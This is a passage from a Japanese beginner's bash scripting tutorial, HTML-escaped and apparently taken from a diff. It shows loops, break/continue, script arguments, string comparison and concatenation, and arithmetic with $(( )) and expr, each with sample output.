-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:untilLoop.sh" data-lang="bash:untilLoop.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="p">;&lt;/span>
-&lt;span class="k">until&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$number&lt;/span> -ge &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$((&lt;/span> number+1 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>上記のコードを「untilLoop.sh」ファイルに保存します。コマンドを使って実行する&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash untilLoop.sh
-1
-2
-3
-4
-5
-6
-7
-8
-9
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>whileループは、条件が true の時に( do &amp;hellip;done) ブロックを実行し、条件が false になるとループを終了します。&lt;/dd>
-&lt;dd>untilループは、条件が false の時に( do &amp;hellip;done) ブロックを実行し、条件が true になるとループを終了します。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h3 id="for-ループ">for ループ:&lt;/h3>
-&lt;p>forループは、繰り返し実行される条件を指定するループのタイプです。&lt;br>
-forループには、いくつかの記述方法があります。&lt;br>
-最初の方法として、反復用の数字を書きます。&lt;br>
-以下に示すコードでは、反復用の数字反復を制御する変数 &amp;lsquo;i&amp;rsquo; にさせます。&lt;br>
-以下のfor ループは 5 回実行されます。&lt;br>
-スクリプトファイル「helloScript.sh」にコードを保存します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:forLoop.sh" data-lang="bash:forLoop.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">for&lt;/span> i in &lt;span class="m">1&lt;/span> &lt;span class="m">2&lt;/span> &lt;span class="m">3&lt;/span> &lt;span class="m">4&lt;/span> &lt;span class="m">5&lt;/span> &lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ターミナルで次のコマンドを入力して、「forLoop.sh」ファイルを実行します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash forLoop.sh
-1
-2
-3
-4
-5
-$
-&lt;/code>&lt;/pre>&lt;p>この方法はシンプルに見えますが、1000回実行したい場合は、実行したい数値を列挙する必要があるため大変です。&lt;br>
-実は、1から1000までの反復回数を書く必要はなく、ループに他の書き方を使用します。&lt;br>
-以下のサンプルコード「for i in {0..10}」のように、反復の開始点と終了点を宣言します。&lt;br>
-この書き方によってforループは10回実行されます。 &amp;lsquo;0&amp;rsquo; は開始点として定義され、&amp;lsquo;10&amp;rsquo; は反復の終了点として定義されます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:forLoop2.sh" data-lang="bash:forLoop2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">for&lt;/span> i in &lt;span class="o">{&lt;/span>0..10&lt;span class="o">}&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ファイル「forLoop2.sh」にコードを保存します。ファイルを実行すると、次の出力が表示されます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash forLoop2.sh
-0
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-$
-&lt;/code>&lt;/pre>&lt;p>ループを制御する変数の増分値を定義することもできます。&lt;br>
-たとえば、「for i in {0..10..2}」では、&amp;lsquo;0&amp;rsquo; をループの開始点、&amp;lsquo;10&amp;rsquo; は終点、&amp;lsquo;2&amp;rsquo; はループは &amp;lsquo;i&amp;rsquo; 2の増分で、echo $i ステートメントを実行します。&lt;br>
-したがって、以下に示す例では、プログラムはループの最初の実行で0を出力し、その後、「i」の値を２つずつインクリメントします。&lt;br>
-このコードは、「i」の値を0,2,4,6,8,10として出力します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">for&lt;/span> i in &lt;span class="o">{&lt;/span>0..10..2&lt;span class="o">}&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash forLoop3.sh
-0
-2
-4
-6
-8
-10
-$
-&lt;/code>&lt;/pre>&lt;p>多くのプログラミング言語でおなじみ「for loop」書式の記述も可能です。&lt;br>
-以下のサンプルコードは、このメソッドを使用して「forループ」を書いています。&lt;br>
-&amp;lsquo;for (( i=0; i&amp;lt;5; i++ ))’ では、&amp;lsquo;i’ はループ全体を制御する変数です。&lt;br>
-まず、値 &amp;lsquo;i&amp;rsquo; は 値 &amp;lsquo;0&amp;rsquo; で初期化され、次にループ &amp;lsquo;i&amp;lt;5&amp;rsquo; の制御ステートメント、&amp;lsquo;i++&amp;rsquo; はループのたびに１つずつインクリメントする事をあわらします。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:increments.sh" data-lang="bash:increments.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;5&lt;span class="p">;&lt;/span> i++ &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;lsquo;i&amp;rsquo;は0で初期化され、&amp;lsquo;i&amp;rsquo;の値が5未満の条件をチェックします。&lt;br>
-最初条件の結果は &amp;lsquo;true&amp;rsquo; です。&lt;br>
-処理ステートメントに進み、、echo コマンドにより端末に「i」の値を「0」として出力します。&lt;br>
-処理が進むにつれ、値「i」が一つずつ増加します。&lt;br>
-プログラムは処理の中で、「i」の値が5未満であるかどうかを再度確認し、再び「i」の値(&amp;lsquo;1」を出力します。&lt;br>
-この実行フローは、「i」の値が「5」の値に達するまで続き、「５」に達した段階ではforループをぬけてプログラムは終了します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash increments.sh
-0
-1
-2
-3
-4
-$
-&lt;/code>&lt;/pre>&lt;h3 id="breakとcontinue">breakとcontinue&lt;/h3>
-&lt;p>breakステートメントは、指定された条件でループを終了するために使用されます。&lt;br>
-以下に示すコードでは、for loopは if ステートメントの条件により、「i」の値が &amp;lsquo;5&amp;rsquo; になるまで通常の実行を行い、「i」が &amp;lsquo;5以上&amp;rsquo; ループを停止します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:break.sh" data-lang="bash:break.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span> i++ &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$i&lt;/span> -gt &lt;span class="m">5&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-break&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクリプトを保存し、ファイルを実行します。次の出力が得られます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash break.sh
-0
-1
-2
-3
-4
-5
-$
-&lt;/code>&lt;/pre>&lt;p>Continueステートメントは、breakステートメントとは対照的に機能します。&lt;br>
-条件が真である場合は反復をスキップ( continue )し、次の反復に向かって処理を進めます。&lt;br>
-以下のループは、&amp;lsquo;3&amp;rsquo; と &amp;lsquo;7&amp;rsquo; を除いて、&amp;lsquo;0&amp;rsquo; から &amp;lsquo;20&amp;rsquo; までの端末に &amp;lsquo;i&amp;rsquo; 変数の値を出力します。&lt;br>
-ifステートメント &amp;lsquo;if [ $i -eq 3 ] || [ $i -eq 7 ]&amp;rsquo; は、&amp;lsquo;i&amp;rsquo; の値が 3 または 7 に等しいときは反復をスキップし、echoせずにforループの処理を進めます。&lt;/p>
-&lt;p>この概念をよりよく理解するために、次のコードを実行します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:continue.sh" data-lang="bash:continue.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span> i++ &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$i&lt;/span> -eq &lt;span class="m">3&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$i&lt;/span> -eq &lt;span class="m">7&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="k">continue&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash continue.sh
-0
-1
-2
-4
-5
-6
-8
-9
-10
-$
-&lt;/code>&lt;/pre>&lt;p>以下のように書くこともできます。こちらの記述のほうがすっきりしていて、Ｃ言語やＪａｖａに慣れ親しんでいる人は、直感的に理解できるかもしれません。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span> i++ &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="m">3&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="m">7&lt;/span> &lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
-&lt;span class="k">continue&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>(( )) で囲む記述で書いていく方が良いかもしれません。&lt;/dd>
-&lt;dd>他の言語で慣れ親しんでいる書き方を踏襲することで、bash独特の書き方に振り回される事がないからです。&lt;/dd>
-&lt;dd>なにより、(( )) 内は、変数の冒頭に &amp;lsquo;$&amp;rsquo; が不要になるだけでも、コードが見やすくなります。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="スクリプトへの値渡し実行パラメータ">スクリプトへの値渡し「実行パラメータ」&lt;/h2>
-&lt;p>このトピックの最初の例は、スクリプトを実行する際に、スクリプトへの入力として値を与えるための説明をします。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:input.sh" data-lang="bash:input.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$1&lt;/span> &lt;span class="nv">$2&lt;/span> &lt;span class="nv">$3&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>このコードは、端末に3つの値を出力します。&lt;br>
-上記のコードをスクリプト「input.sh」に保存します。実行時に実行ファイル名に続き、三つの値を指定して、スクリプトに値を渡します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash input.sh BMW MERCEDES TOYOTA
-$ BMW MERCEDES TOYOTA
-$
-&lt;/code>&lt;/pre>&lt;p>スクリプト実行時に渡した３つの値はそれぞれコードの中で、「BMW」は「$1」、「MERCEDES」は「$2」、「TOYOTA」は「$3」に値は入力されます。&lt;/p>
-&lt;p>echoステートメントに「$0」を指定すると、スクリプト名も出力されます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:input2.sh" data-lang="bash:input2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$0&lt;/span> &lt;span class="nv">$1&lt;/span> &lt;span class="nv">$2&lt;/span> &lt;span class="nv">$3&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash input2.sh BMW MERCEDES TOYOTA
-$ input2.sh BMW MERCEDES TOYOTA
-$
-&lt;/code>&lt;/pre>&lt;p>この目的のために配列を使用することもできます。&lt;br>
-配列を宣言するには、コード &amp;lsquo;args=(&amp;quot;$@&amp;quot;)&amp;rsquo; を使用します。&lt;br>
-このコード &amp;lsquo;args&amp;rsquo; は配列の名前であり、'@&amp;rsquo; は無限の数の値を持つ可能性があることを表します。&lt;br>
-このタイプの配列宣言は、入力のサイズがわからない場合に便利です。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:args.sh" data-lang="bash:args.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">args&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">args&lt;/span>&lt;span class="p">[0]&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">args&lt;/span>&lt;span class="p">[1]&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">args&lt;/span>&lt;span class="p">[2]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>BMW&amp;rsquo;は${args[0]}、「MERCEDES」は${args[1]}、「HONDA」は${args[2]}を表します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash args.sh BMW MERCEDES TOYOTA
-$ BMW MERCEDES TOYOTA
-$
-&lt;/code>&lt;/pre>&lt;p>以下に示すコードは、無限の数の値を持つ配列の値を出力できます。&lt;br>
-前の例では、使用されるコマンド &amp;lsquo;echo ${args[0]} ${args[1]} ${args[2]}は配列の最初の3つの値のみを出力しますが、今回のコードは、出力を指定することなく、渡された値の全てを出力します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:args2.sh" data-lang="bash:args2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">args&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$@&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash args2.sh BMW MERCEDES TOYOTA
-BMW MERCEDES TOYOTA
-$ bash args2.sh BMW MERCEDES TOYOTA HONDA
-BMW MERCEDES TOYOTA HONDA
-$
-&lt;/code>&lt;/pre>&lt;p>&amp;lsquo;echo $#&amp;rsquo; と書いて配列サイズを出力することもできます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:args3.sh" data-lang="bash:args3.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">args&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$@&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$#&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash args3.sh BMW MERCEDES TOYOTA
-BMW MERCEDES TOYOTA
-3
-$ bash args3.sh BMW MERCEDES TOYOTA HONDA
-BMW MERCEDES TOYOTA HONDA
-4
-$
-&lt;/code>&lt;/pre>&lt;h2 id="文字列処理">文字列処理&lt;/h2>
-&lt;h3 id="文字列の比較">文字列の比較&lt;/h3>
-&lt;p>このトピックでは、文字列の比較を紹介します。&lt;br>
-プログラムは、ユーザーから2つの文字列入力を受け取ります。&lt;br>
-プログラムはそれぞれの値を読みこみ、２つの異なる変数 &amp;lsquo;st1&amp;rsquo; &amp;lsquo;st2&amp;rsquo; に格納します。&lt;br>
-両方の変数の値を比較するには、「if」ステートメントを使用し、条件文に「==」演算子で、二つの文字列が等価であるかを判定します。&lt;br>
-「else」ステートメントは、「文字列が一致しない」場合の処理を記述し、&amp;lsquo;if&amp;rsquo; ステートメントを閉じます。&lt;/p>
-&lt;p>以下は、この手順全体のスクリプトコードです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:string.sh" data-lang="bash:string.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter Ist string&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> st1&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter 2nd string&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> st2&lt;span class="p">;&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$st1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$st2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;strings match&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;strings don&amp;#39;t match&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクリプトを「string.sh」に保存します。ターミナルからファイルを実行し、比較のために2つの文字列を与えます。異なる入力を使用してコードをテストすることもできます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash string.sh
-enter Ist string
-BMW
-enter 2nd string
-BMW
-strings match
-$
-$ bash string.sh
-enter Ist string
-BMW
-enter 2nd string
-HONDA
-strings don't match
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>文字列の比較は == です。&lt;/dd>
-&lt;dd>数値の比較は -eq -gt -lt -ge です。&lt;/dd>
-&lt;dd>-eq は[ == ] equals&lt;/dd>
-&lt;dd>-gt は[ &amp;gt; ]greater than&lt;/dd>
-&lt;dd>-lt は[ &amp;lt; ] less than&lt;/dd>
-&lt;dd>-ge は[ &amp;gt;= ] greater equals です。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h3 id="連結">連結&lt;/h3>
-&lt;p>2つの文字列を連結することもできます。&lt;br>
-プルグラムはユーザーへ入力を促し、２つの変数を &amp;lsquo;st1&amp;rsquo; &amp;lsquo;st2&amp;rsquo; 変数に格納します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:connect.sh" data-lang="bash:connect.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter 1st string&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> st1&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter 2nd string&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> st2&lt;span class="p">;&lt;/span>
-&lt;span class="nv">st3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$st1&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$st2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$st3&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>このコードを「connect.sh」に保存し、端末を使用してファイルを実行し、結果を確認します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash connect.sh
-enter 1st string
-BMW
-enter 2nd string
-HONDA
-BMW HONDA
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>文字列の結合時にそれぞれの変数の間に空白を起きたい場合は、以下のように二つの変数を「&amp;quot; &amp;ldquo;」ダブるクォーテーションで囲みます。&lt;/dd>
-&lt;dd>st3=&amp;quot;$st1 $st2&amp;rdquo;;&lt;/dd>
-&lt;dd>
-&lt;p>文字列を扱う場合、日頃から変数はダブルクォーテーションで囲む癖をつけておくべきです。&lt;/p>
-&lt;/dd>
-&lt;dd>変数への代入が「空（くうはく）」だった場合に、プログラムがバグにより停止します。&lt;/dd>
-&lt;dd>
-&lt;p>これは、文字列を扱う変数に限らず、次章で紹介する数値を格納する変数でも同じです。&lt;/p>
-&lt;/dd>
-&lt;dd>変数はつねに &amp;quot; &amp;quot; ダブルクオーテーションで囲みましょう。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="数値計算処理">数値計算処理&lt;/h2>
-&lt;p>このトピックでは、スクリプトを使用してさまざまな数値演算を実行する方法を学習します。&lt;br>
-最初の方法では、２つの変数を値で定義し、echoステートメントと「+」演算子を使用してこれらの変数の合計を出力します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:numberCalc.sh" data-lang="bash:numberCalc.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">n1&lt;/span>&lt;span class="o">=&lt;/span>4&lt;span class="p">;&lt;/span>
-&lt;span class="nv">n2&lt;/span>&lt;span class="o">=&lt;/span>20&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">+&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash numberCalc.sh
-24
-$
-&lt;/code>&lt;/pre>&lt;h3 id="四則演算">四則演算&lt;/h3>
-&lt;p>加算、減算、乗算、除算などの複数の操作を実行するための単一のスクリプトを書くこともできます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:numberCalc2.sh" data-lang="bash:numberCalc2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">n1&lt;/span>&lt;span class="o">=&lt;/span>20&lt;span class="p">;&lt;/span>
-&lt;span class="nv">n2&lt;/span>&lt;span class="o">=&lt;/span>4&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">+&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">-&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">*&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">/&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">%&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash numberCalc2.sh
-24
-16
-80
-5
-0
-$
-&lt;/code>&lt;/pre>&lt;h3 id="算術演算-exprコマンド">算術演算 exprコマンド&lt;/h3>
-&lt;p>算術演算を実行する他の方法は、「expr」コマンドを使用することです。&lt;br>
-この「expr」は、これらのn1とn2を他の変数とみなし、操作を実行することです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:numberCalc3.sh" data-lang="bash:numberCalc3.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">n1&lt;/span>&lt;span class="o">=&lt;/span>20&lt;span class="p">;&lt;/span>
-&lt;span class="nv">n2&lt;/span>&lt;span class="o">=&lt;/span>4&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> + &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash numberCalc3.sh
-24
-$
-&lt;/code>&lt;/pre>&lt;p>「expr」を使用して四則演算を処理してみます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:numberCalc4.sh" data-lang="bash:numberCalc4.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">n1&lt;/span>&lt;span class="o">=&lt;/span>20&lt;span class="p">;&lt;/span>
-&lt;span class="nv">n2&lt;/span>&lt;span class="o">=&lt;/span>4&lt;span class="p">;&lt;/span>
